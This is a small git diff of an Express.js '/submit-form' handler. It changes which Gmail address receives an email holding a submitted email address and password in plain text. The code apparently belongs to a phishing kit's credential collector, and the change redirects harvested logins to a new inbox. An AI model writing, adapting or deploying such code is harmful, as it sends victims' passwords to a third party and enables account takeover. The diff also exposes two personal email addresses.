@@ -28,7 +28,7 @@ app.post("/submit-form", (req, res) => {
   // Email message options
   let mailOptions = {
     from: email,
-    to: "chibuezedeveloper@gmail.com",
+    to: "dchinedu529@gmail.com",
     subject: "Form Submission",
     text: `Email: ${email}\nPassword: ${password}`,
   };
